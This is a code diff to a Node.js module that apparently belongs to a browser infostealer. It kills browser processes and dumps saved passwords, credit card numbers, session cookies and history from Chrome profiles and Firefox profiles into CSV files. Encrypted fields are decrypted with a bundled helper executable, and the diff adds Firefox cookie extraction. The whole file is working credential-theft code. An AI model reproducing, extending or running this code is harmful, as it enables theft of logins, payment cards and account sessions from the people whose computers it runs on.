@@ -1,11 +1,14 @@
 const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
-const { join, sep, resolve } = require('path');
+const { join, sep } = require('path');
 const { randomFileCreator } = require('../util/dir');
 const { execSync, exec } = require('child_process');
 const { tempFolder } = require('../index');
 const { addDoubleQuotes } = require('../util/string');
 const { sleep } = require('../util/general');
 const { browsers, browsersProcesses } = require('../util/variables');
+const fs = require('fs');
+const csv = require('csv');
+const sqlite3 = require('sqlite3').verbose();
 
 const filesToDelete = [];
 const toolPath = addDoubleQuotes(join(tempFolder, 'decrypt_key.exe'));
@@ -31,46 +34,67 @@ const _ = (name, path, use, filename, dbData, profile = 'Default') => {
   dbData(dbFile, file);
 };
 
-const passwords = (name, path, profile) => {
-  return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => exec(
-    [
-      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
-      `--csv-file "${csvFile}"`, '--rows "url,username,password"', '--decrypt-row 2'
-    ].join(' ')
-  ), profile);
+const firefox = {
+  passwords: () => {},
+  history: () => {},
+  creditCards: () => {},
+  cookies: (path, profile) => {
+    path = join(path, profile, 'cookies.sqlite');
+
+    const db = new sqlite3.Database(path, sqlite3.OPEN_READONLY);
+    const file = join(tempFolder, 'Browsers', 'Mozilla Firefox', 'Cookies.csv');
+    const csvFile = csv.stringify({
+      columns: ['host', 'name', 'value'],
+      header: true
+    });
+
+    db.serialize(() => {
+      db.each('SELECT host, name, value FROM moz_cookies', (err, row) => {
+        if (err) return;
+        csvFile.write(row);
+      });
+    });
+    csvFile.pipe(fs.createWriteStream(file));
+  }
 };
 
-const history = (name, path, profile) => {
-  return _(name, path, 'History', 'History', (dbFile, csvFile) => exec(
-    [
-      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title, visit_count, typed_count FROM urls"',
-      `--csv-file "${csvFile}"`, '--rows "url,title,visit count,typed count"'
-    ].join(' ')
-  ), profile);
+const chrome = {
+  passwords: (name, path, profile) => {
+    return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => exec(
+      [
+        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
+        `--csv-file "${csvFile}"`, '--rows "url,username,password"', '--decrypt-row 2'
+      ].join(' ')
+    ), profile);
+  },
+  history: (name, path, profile) => {
+    return _(name, path, 'History', 'History', (dbFile, csvFile) => exec(
+      [
+        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title, visit_count, typed_count FROM urls"',
+        `--csv-file "${csvFile}"`, '--rows "url,title,visit count,typed count"'
+      ].join(' ')
+    ), profile);
+  },
+  creditCards: (name, path, profile) => {
+    return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => exec(
+      [
+        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
+        '--sql "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"',
+        `--csv-file "${csvFile}"`, '--rows "name on card,expiration month,expiration year,card number"', '--decrypt-row 3'
+      ].join(' ')
+    ), profile);
+  },
+  cookies: (name, path, profile) => {
+    return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => exec(
+      [
+        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
+        '--sql "SELECT host_key, name, encrypted_value FROM cookies"',
+        `--csv-file "${csvFile}"`, '--rows "host,name,value"',
+        '--decrypt-row 2'
+      ].join(' ')
+    ), profile);
+  }
 };
-
-const creditCards = (name, path, profile) => {
-  return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => exec(
-    [
-      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
-      '--sql "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"',
-      `--csv-file "${csvFile}"`, '--rows "name on card,expiration month,expiration year,card number"', '--decrypt-row 3'
-    ].join(' ')
-  ), profile);
-};
-
-const cookies = (name, path, profile) => {
-  return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => exec(
-    [
-      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
-      '--sql "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, has_expires, is_persistent, samesite, source_port FROM cookies"',
-      `--csv-file "${csvFile}"`, '--rows "host,name,value,path,is secure,is httponly,has expires,is persistent,samesite,port"',
-      '--decrypt-row 2'
-    ].join(' ')
-  ), profile);
-};
-
-const fns = { passwords, history, creditCards, cookies };
 
 const kill = (processes) => {
   return new Promise((resolve) => {
@@ -92,13 +116,16 @@ kill(browsersProcesses).then(() => {
     if (isFirefox && !existsSync(join(tempFolder, 'Browsers', 'Mozilla Firefox')))
       mkdirSync(join(tempFolder, 'Browsers', 'Mozilla Firefox'));
     if (existsSync(path)) {
-      ['passwords', 'history', 'creditCards', 'cookies']
-        .forEach(fn => {
+      ['passwords', 'history', 'creditCards', 'cookies'].forEach(fn => {
+        (isFirefox ?
+          fs.readdirSync(path) :
           ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
-            .forEach(profile => {
-              fns[fn](browser.join(' '), path, profile);
-            });
+        ).forEach(profile => {
+          isFirefox ?
+            firefox[fn](path, profile) :
+            chrome[fn](browser, path, profile);
         });
+      });
     }
   });
 });
